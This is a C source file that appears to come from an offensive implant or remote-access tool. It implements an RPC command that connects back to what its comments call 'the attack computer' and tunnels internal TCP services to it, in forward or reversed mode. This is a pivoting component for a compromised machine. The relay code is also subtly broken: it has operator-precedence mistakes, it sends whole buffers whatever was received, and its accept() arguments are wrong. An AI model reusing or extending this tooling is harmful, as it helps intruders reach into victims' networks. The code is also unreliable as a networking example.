#include "rpc/tunnel/tunnel.h"

struct RPCTunnel tunnel_deserialize(const struct RPC rpc);

/**
 * @brief The rpc tunnel function, tunnels a TCP service into the attack computer.
 * 
 * @param rpc 
 * @return int 
 */
int rpc_tunnel(struct RPC rpc) {
    struct RPCTunnel tunnel = tunnel_deserialize(rpc);

    // connect to the tunnel_port.
    int tunnel_fd = create_socket();

    if ((connect_socket(tunnel_fd, tunnel.local.address, tunnel.tunnel_port)) != 0) {
        // The connection failed.
        return -1;
    }
    
    if (tunnel.reversed) { // in case the tunnel is reversed.
        handle_reversed_tunnel(tunnel, tunnel_fd);
    } else { // in case the tunnel is not reversed.
        handle_unreversed_tunnel(tunnel, tunnel_fd);
    }

    return 0;
}

/**
 * @brief Handles unreversed tunnel, connects to the desired service and forwards the packets to the tunnel port. 
 * 
 * @param tunnel 
 * @param tunnel_fd 
 * @return int 
 */
int handle_unreversed_tunnel(struct RPCTunnel tunnel, int tunnel_fd) {
    int service_fd = socket(AF_INET, SOCK_STREAM, 0);

    if ((connect_socket(service_fd, tunnel.remote.address, tunnel.remote.port) != 0)) {
        // The service connection failed.
        close(service_fd);

        return -1;
    }

    tunnel_handler(tunnel_fd, service_fd);
    
    return 0;
}

/**
 * @brief Handles a reversed tunnel, creates a socket server at the desire port and address.
 * 
 * @param tunnel 
 * @return int 
 */
int handle_reversed_tunnel(struct RPCTunnel tunnel, int tunnel_fd) {
    int service_fd = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in address = create_sockaddr(tunnel.remote.address, tunnel.remote.port);

    bind(service_fd, &address, sizeof(address));

    listen(service_fd, 5);

    while (1) {
        int client_fd = accept(service_fd, &address, sizeof(address));

        tunnel_handler(tunnel_fd, client_fd);
    }

    return service_fd;
}

/**
 * @brief Handles the tunnel, forwards the messages from each side. 
 * 
 * @param tunnel_fd 
 * @param service_fd 
 * @return int 
 */
int tunnel_handler(int tunnel_fd, int service_fd) {
    char buffer[4096];
    int bytes_recv;
    memset(buffer, 0x00, sizeof(buffer));

    while (1) {
        if ((bytes_recv = recv(tunnel_fd, buffer, sizeof(buffer), MSG_DONTWAIT) > 0)) {
            send(service_fd, buffer, sizeof(buffer), MSG_CONFIRM);
            memset(buffer, 0x00, sizeof(buffer));
        } else if (bytes_recv == -1) {
            return -1;
        }

        if (bytes_recv = (recv(service_fd, buffer, sizeof(buffer), MSG_DONTWAIT) > 0)) {
            send(tunnel_fd, buffer, sizeof(buffer), MSG_CONFIRM);       
            memset(buffer, 0x00, sizeof(buffer));
        } else if(bytes_recv == -1) {
            return 01;
        }
    }
}

/**
 * @brief The tunnel deserializer. 
 * 
 * @param rpc 
 * @return struct RPCTunnel 
 */
struct RPCTunnel tunnel_deserialize(const struct RPC rpc) {
    struct RPCTunnel tunnel;
    
    tunnel.function_id = rpc.function_id;

    char * arguments = rpc.arguments;

    char * s_local = arguments;
    char * s_remote = arguments + sizeof(struct IPTunnel);
    char * s_tunnel_port = s_remote + sizeof(struct IPTunnel);
    char * s_reversed = s_tunnel_port + sizeof(int);
    char * s_null_bytes = s_reversed;

    struct IPTunnel *local = (struct IPTunnel *) s_local;
    struct IPTunnel *remote = (struct IPTunnel *) s_remote;
    int tunnel_port = *((int *) s_tunnel_port);
    int reversed = *((int *) s_reversed);
    char null_bytes[4096 - (2*sizeof(int)) - (2*sizeof(struct IPTunnel))];

    tunnel.local = *local;
    tunnel.remote = *remote;
    tunnel.tunnel_port = tunnel_port;
    tunnel.reversed = reversed;
    strncpy(tunnel.null_bytes, s_null_bytes, sizeof(null_bytes));

    return tunnel;
}